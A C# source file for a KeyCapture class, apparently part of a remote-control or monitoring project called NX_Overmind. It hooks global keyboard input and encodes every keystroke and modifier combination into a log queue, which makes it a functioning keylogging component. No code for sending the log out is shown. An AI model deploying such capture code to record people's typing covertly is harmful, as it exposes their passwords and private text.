using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using NX.Hooks;

namespace NX_Overmind
{    
    class KeyCapture
    {     
        private KeyboardHook kh = null;
        
        private List<int> pressedKeys = new List<int>();
        private List<int> modifierKeys = new List<int>();
        private char pressedChar = ' ';
        
        //private Queue<string> keyLog = new Queue<string>();
        private LogQueue<byte[]> keyLog = null;

        public KeyCapture(LogQueue<byte[]> log)
        {
            this.kh = new KeyboardHook();            
            this.kh.KeyDown += new KeyboardHook.KeyHandler(kh_KeyDown);
            this.kh.KeyPressed += new KeyboardHook.KeyHandler(kh_KeyPressed);
            this.kh.KeyUp += new KeyboardHook.KeyHandler(kh_KeyUp);

            if (log != null)
                this.keyLog = log;
            else
                this.keyLog = new LogQueue<byte[]>();
        }

        public bool IsRunning()
        {
            return this.kh.IsHooked();
        }

        public void Start()
        {
            this.kh.EnableHook();
        }

        public void Stop()
        {
            this.kh.DisableHook();
        }

        void kh_KeyDown(KeyHookEventArgs e)
        {            
            if (this.IsModifierKey(e.KeyCode))
            {
                if(this.modifierKeys.IndexOf(e.KeyValue) < 0)
                    this.modifierKeys.Add(e.KeyValue);
            }
            else if (this.pressedKeys.IndexOf(e.KeyValue) < 0)
            {                
                this.pressedKeys.Add(e.KeyValue);
            }
        }

        void kh_KeyPressed(KeyHookEventArgs e)
        {            
            // Will not receive CTRL+F6           
            // Only CTRL + Alphabet                 
            if (!(e.KeyChar == '\0' || Char.IsControl(e.KeyChar)))
            {
                if (this.pressedChar != e.KeyChar)                // If pressed CharKey is different then process. Avoids clutter.
                {
                    this.pressedChar = e.KeyChar;
                    LogKeyCombo(e);
                    this.pressedKeys.Remove(e.KeyValue);                    
                }
            }            
        }

        void kh_KeyUp(KeyHookEventArgs e)
        {
            // Reset CharKey
            if (this.pressedChar != '\0')
            {                
                this.pressedKeys.Remove(((int)this.pressedChar - 32));  // Remove CharKey if present due to persistant press
                this.pressedChar = '\0';                
            }
            
            // Log Key
            LogKeyCombo(e);

            if (this.IsModifierKey(e.KeyCode))
                this.modifierKeys.Remove(e.KeyValue);                
            else
            {                
                this.pressedKeys.Remove(e.KeyValue);
            }
        }

        private void LogKeyCombo(KeyHookEventArgs e)
        {
            if (this.pressedKeys.Count != 0)
            {
                /*string _t = String.Format("[{0}]", String.Join(" + ", this.pressedKeys.ToArray()));
                if (this.pressedChar != '\0')
                {
                    _t += this.pressedChar;
                    this.pressedChar = '\0';
                }
                this.keyLog.Enqueue(_t);*/
                this.keyLog.Enqueue(HookEventCodec.GetEncodedData(HookEventCodec.EventClass.KeyEvent, HookEventCodec.EventType.KeyPress, this.CreateArgument(e), this.pressedKeys.ToArray(), this.pressedChar));
                
            }            
        }

        private bool IsModifierKey(Keys key)
        {
            switch (key)
            {                
                case Keys.LMenu:
                case Keys.RMenu:                
                case Keys.LShiftKey:
                case Keys.RShiftKey:                
                case Keys.LControlKey:
                case Keys.RControlKey:
                    return true;
            }
            return false;
        }

        /**
         * Assigns Modifier Key values keeping in mind their histories.
         * Helpful it Ctrl+X was pressed but Ctrl key was released before X key.
         * 
        */ 
        private KeyHookEventArgs CreateArgument(KeyHookEventArgs e)
        {
            bool alt = e.Alt;
            bool ctrl = e.Control;
            bool shift = e.Shift;            
            foreach (int key in this.modifierKeys)
            {
                switch ((Keys)key)
                {
                    case Keys.LMenu:
                    case Keys.RMenu:
                        alt = true;
                        break;
                    case Keys.LShiftKey:
                    case Keys.RShiftKey:
                        shift = true;
                        break;
                    case Keys.LControlKey:
                    case Keys.RControlKey:
                        ctrl = true;
                        break;
                }
            }            
            return new KeyHookEventArgs((uint)e.KeyValue, e.KeyChar, e.Injected, alt, ctrl, shift, e.CapsLock, e.NumLock, e.ScrollLock);
        }

        /*public string[] ProcessLog()
        {
            lock (this)
            {
                string[] log = this.keyLog.ToArray();
                this.keyLog.Clear();
                return log;
            }
        }*/
    }
}
